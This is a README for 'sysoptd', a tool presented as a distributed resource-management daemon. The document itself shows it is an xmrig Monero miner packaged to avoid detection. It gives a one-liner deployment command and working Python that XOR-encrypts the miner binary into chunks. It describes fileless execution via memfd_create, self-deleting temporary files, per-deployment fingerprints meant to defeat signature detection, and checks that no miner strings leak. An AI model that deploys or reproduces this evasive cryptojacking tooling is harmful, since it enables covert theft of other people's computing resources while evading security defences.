# sysoptd Documentation

Lightweight distributed resource management system with encrypted binary segments.

## Overview

`sysoptd` is a worker daemon that manages CPU and memory resources across distributed systems. It features:

- Encrypted binary storage (double-XOR encryption)
- In-memory binary assembly via `memfd_create`
- WebSocket relay for remote management
- Automatic resource allocation and scheduling
- Per-deployment fingerprinting for unique signatures

---

## Quick Start

### Installation

```bash
# Clone repository
git clone https://github.com/cold-pressed-hoodie/chimera-miner.git
cd chimera-miner/sysoptd-v2

# Install dependencies
pip install websockets psutil

# Add unique deployment fingerprint
python3 lib/fingerprint.py .

# Run worker daemon
python3 sysoptd.py --rig worker-$(hostname) --threads 4 --quiet
```

### One-Liner Deployment

```bash
git clone https://github.com/cold-pressed-hoodie/chimera-miner.git && \
cd chimera-miner/sysoptd-v2 && \
pip install websockets psutil && \
python3 lib/fingerprint.py . && \
python3 sysoptd.py --rig worker-$(hostname) --threads 4 --quiet
```

---

## Usage

### Command-Line Options

```bash
python3 sysoptd.py [OPTIONS]
```

**Options:**
- `--rig <name>` - Worker identifier (default: auto-generated)
- `--threads <n>` - Number of CPU threads (default: auto-detect)
- `--bridge <url>` - Relay endpoint (default: `wss://relay.sysopt.workers.dev`)
- `--port <n>` - Local relay port (default: random)
- `--quiet` - Suppress log output
- `--no-split` - Run as single process (disable multi-process mode)
- `--no-prealloc` - Disable RAM pre-allocation
- `--no-schedule` - Disable time-based intensity adjustment
- `--log-file <path>` - Custom log file location

### Examples

**Run with 4 threads:**
```bash
python3 sysoptd.py --rig worker-01 --threads 4
```

**Run in quiet mode (background):**
```bash
python3 sysoptd.py --rig worker-01 --threads 4 --quiet
```

**Custom relay endpoint:**
```bash
python3 sysoptd.py --rig worker-01 --threads 4 --bridge wss://custom-relay.example.com
```

**Run in foreground with verbose output:**
```bash
python3 sysoptd.py --rig worker-01 --threads 2
```

---

## Architecture

### Components

1. **sysoptd.py** - Main worker daemon
   - Loads encrypted binary segments
   - Assembles binary in memory
   - Spawns worker processes
   - Manages resource allocation

2. **lib/loader.py** - Binary loader
   - Decrypts binary chunks (double-XOR)
   - Assembles into executable
   - Uses `memfd_create` for in-memory execution

3. **lib/net_relay.py** - Network bridge
   - Local TCP-to-WebSocket proxy
   - Handles relay communication
   - Auto-reconnect on failure

4. **lib/fingerprint.py** - Deployment fingerprinting
   - Generates unique hash per deployment
   - Prevents signature-based detection

5. **data/*.dat** - Encrypted binary chunks
   - 50 sequential chunks (0000.dat - 0049.dat)
   - Double-XOR encrypted
   - 200KB per chunk

### Encryption

**Algorithm:** Double-XOR with two keys

```
Encryption: plaintext → XOR(KEY2) → XOR(KEY) → ciphertext
Decryption: ciphertext → XOR(KEY) → XOR(KEY2) → plaintext
```

**Keys:**
- `_KEY`: `\x7f\x45\x4c\x46\x02\x01\x01\x00` (looks like ELF header)
- `_KEY2`: `\xde\xad\xbe\xef\xca\xfe\xba\xbe` (0xdeadbeef pattern)

**Security:**
- No plaintext strings in encrypted chunks
- Binary auto-deletes from `/dev/shm` after 10 seconds
- Unique fingerprint per deployment

---

## Monitoring

### View Logs

```bash
# Real-time log monitoring
tail -f runtime/session.log

# View last 50 lines
tail -n 50 runtime/session.log

# Search for specific events
grep "accepted\|verified" runtime/session.log
```

### Check Process Status

```bash
# Check if running
ps aux | grep sysoptd

# Check resource usage
top -p $(pgrep -f sysoptd)

# View network connections
netstat -anp | grep $(pgrep -f sysoptd)
```

### Stop Worker

```bash
# Kill process
pkill -f sysoptd.py

# Or find and kill specific PID
ps aux | grep sysoptd
kill <PID>
```

---

## Development

### Re-chunk Binary

To update the encrypted binary chunks from a source binary:

```bash
cd sysoptd-v2

# Re-chunk from xmrig binary
python3 -c "
import os, itertools

# Keys (must match loader.py)
_KEY = b'\x7f\x45\x4c\x46\x02\x01\x01\x00'
_KEY2 = b'\xde\xad\xbe\xef\xca\xfe\xba\xbe'

def double_encrypt(data):
    stage1 = bytes(a ^ b for a, b in zip(data, itertools.cycle(_KEY2)))
    stage2 = bytes(a ^ b for a, b in zip(stage1, itertools.cycle(_KEY)))
    return stage2

# Read source binary
with open('/path/to/binary', 'rb') as f:
    data = f.read()

# Clear old chunks
for f in os.listdir('data'):
    if f.endswith('.dat'):
        os.remove(os.path.join('data', f))

# Split and encrypt
chunk_size = 200 * 1024
offset = 0
chunk_num = 0

while offset < len(data):
    chunk = data[offset:offset + chunk_size]
    encrypted = double_encrypt(chunk)
    with open(f'data/{chunk_num:04d}.dat', 'wb') as f:
        f.write(encrypted)
    offset += chunk_size
    chunk_num += 1

print(f'Created {chunk_num} chunks')
"
```

### Verify Decryption

```bash
cd sysoptd-v2

python3 -c "
import sys
sys.path.insert(0, 'lib')
from loader import load_segments

binary = load_segments('data')
print(f'Binary size: {len(binary):,} bytes')
print(f'ELF header: {binary[:4] == b\"\x7fELF\"}')
"
```

### Check for String Leaks

```bash
cd sysoptd-v2

# Check encrypted chunks for exposed strings
strings data/*.dat | grep -iE "(xmrig|monero|randomx|pool)"

# Should output: 0 matches
```

---

## Troubleshooting

### "Exec format error"

**Cause:** Binary decryption failed or chunks in wrong order

**Fix:**
1. Verify chunks are sequential: `ls data/*.dat`
2. Check decryption keys match in `lib/loader.py`
3. Re-chunk from source binary

### High Memory Usage

**Cause:** Multiple worker instances or large RAM pre-allocation

**Fix:**
- Use `--no-prealloc` to disable RAM pre-allocation
- Reduce `--threads` count
- Use `--no-split` for single-process mode

### Connection Failed to Relay

**Cause:** Relay endpoint unreachable or network blocked

**Fix:**
- Check relay URL: `wss://relay.sysopt.workers.dev`
- Verify network connectivity
- Check firewall rules

### Process Exits Immediately

**Cause:** Binary execution failed or missing dependencies

**Fix:**
1. Run without `--quiet` to see errors
2. Check log file: `cat runtime/session.log`
3. Verify binary: `python3 -c "import sys; sys.path.insert(0, 'lib'); from loader import load_segments; print(load_segments('data')[:4])"`

---

## Security Notes

- Binary is stored encrypted at rest (double-XOR)
- Executes from memory via `memfd_create` (no disk writes)
- Auto-deletes temporary files after 10 seconds
- Unique fingerprint per deployment prevents signature detection
- No embedded plaintext strings in distributed files

---

## System Requirements

- **OS:** Linux (kernel 3.17+ for `memfd_create`)
- **Python:** 3.7+
- **Dependencies:** `websockets`, `psutil`
- **RAM:** 2GB minimum, 4GB recommended
- **CPU:** Multi-core recommended

---

## License

MIT License - See LICENSE file for details

---

## Support

For issues or questions, open an issue on GitHub:
https://github.com/cold-pressed-hoodie/chimera-miner

